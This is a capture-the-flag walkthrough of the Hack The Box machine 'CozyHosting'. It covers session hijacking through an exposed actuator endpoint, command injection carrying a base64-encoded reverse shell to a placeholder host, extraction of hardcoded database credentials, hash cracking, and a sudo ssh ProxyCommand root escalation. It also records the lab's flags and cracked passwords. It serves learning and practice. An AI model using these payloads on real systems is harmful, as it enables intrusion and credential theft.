![[CozyHosting 1.png]]
# Initial Reconnaissance
1. `curl -I 10.10.11.230` to find possible location / DNS name
2. get a result of `cozyhosting.htb`, add to `/etc/hosts`
3. login page doesn't have any known back end, tried another way
4. tried to login with any credentials `admin:admin`, wrong credentials
5. check for cookies, and there's a `JSESSIONID` cookie (possible session hijacking), tried to find any open directory
6. `dirsearch -u cozyhosting.htb` (have tried other with gobuster and bunch of wordlists, this seems to works better)
7. found an `/actuator/` directory containing sessions. and im able to hijack a session from this

# User Escalation
1. earlier i found an `/actuator/` directory with `dirsearch`, i found a path in `/actuator/sessions`
2. visiting the directory actually gives a `JSESSIONID` with the username `kanderson`
3. change the cookie, enter `kanderson` as the username and random password value
4. pressing the login button actually bypasses the login pages
5. there's nothing more interact-able except using this `connection settings`, try to include something random `127.0.0.1:test` while capturing the requests in burpsuite
6. returns out some `host key error`, trying another payloads
7. entering `;` or `'` or `"` and any other symbols used in linux such as wildcards resulting in the request shows an error of `ssh` command, it seems like this is a possible command injection and actually could run a reverse shell
8. trying a bunch of payload and found one working `;echo${IFS}COMMAND_BASE64|base64${IFS}-d|bash;`
9. encode the payload in base64 `echo "sh -i >& /dev/tcp/your-ip/port 0>&1" | base64 -w 0`
10. setup a listener in terminal with `nc -lvnp port`, make sure the port is the same as which is on the payload.
11. after i craft the payload, send it to the username section, and check for connection on the listener
12. after i got a connection, tried to `ls` and there's a file named `cloudhosting-0.0.1.jar`, should try to download it
13. to download the file from the target machine, serves a http server on the target machine with python with `python3 -m http.server` and it will serves http fileserver on port 8000
14. to download the file on the local machine use `wget 10.10.11.230:8000/cloudhosting-0.0.1.jar`
15. after the download complete, open the jar with `jd-gui cloudhosting-0.0.1.jar`
16. after i carefully analyzing the file, i notice there's an exposed credentials in `BOOT-INF > classes > application.properties`, the postgres sql credential is hardcoded as `postgres:Vg&nvzAQ7XxR` and a database name of `cozyhosting`
17. after gaining the database credentials, tried to open the database in the target connection, first i open up the database `psql -U postgres -h localhost -W`, enter the password from extracted credentials
18. after i get in, i list the table available with `\l` and it shows some table and one i'm looking for is `cozyhosting`, so i connect with `\c cozyhosting`, then there's a prompt saying i'm successfully connected to that database and list the tables with `\dt` there's shown 2 tables `hosts` and `users` i'm interested in the `users` table, so i get the content with `select * from users;` and it return  2 rows with 3 column a name, password hash, and role. one being Kanderson with the role user and the other is with the role admin, trying to crack the hash
19. to crack the hash first i need to identify the hash, so i move the hash value into a file named `admin.hash` and then run `hashid admin.hash` it return a possible of 3 hash `blowfish`, `woltlab`, `bcrypt`, i will use `hashcat` to crack the hash with `rockyou.txt` wordlists
20. knowing the hash i want to specify the mode in hashcat, so i search the mode from here `https://gist.github.com/dwallraff/6a50b5d2649afeb1803757560c176401`, there's 2 result `3200` and `18600` but 3200 looks exactly the same as the hash i found, so i run the command `hashcat -m 3200 admin.hash rockyou.txt`, after some while it will return a password of `manchesterunited`, next i want to find it's username
21. to find the username, from the reverse connection, do `ls /home` and i get a directory for a user named `josh` and with that i have a complete credentials for the ssh login `josh:manchesterunited`
22. connect to the ssh as josh `ssh josh@10.10.11.230`, enter `yes` if there's a prompt and input the password
23. once inside `ls` and there's the user flag, `cat user.txt`
24. flag: `7072315530398ffe299eb27512fed5b2`

# Further Reconnaissance
1. `sudo -l` to check any available sudo command, turns out i could run ssh as sudo

# Privilege Escalation
1. i know that i could run ssh as sudo, now to find any available exploits with this payload `sudo ssh -o ProxyCommand=';sh 0<&2 1>&2' x`, read more from here `https://gtfobins.github.io/gtfobins/`
2. after submitting the payload, i notice that the ssh connection turns into a `#` which mean i have successfully done privilege escalation, now to find the flag
3. `cat /root/root/txt`
4. flag: `a324942ccd71927d1e4fc8c564c57995`

![[CozyHosting-Pwned.png]]
   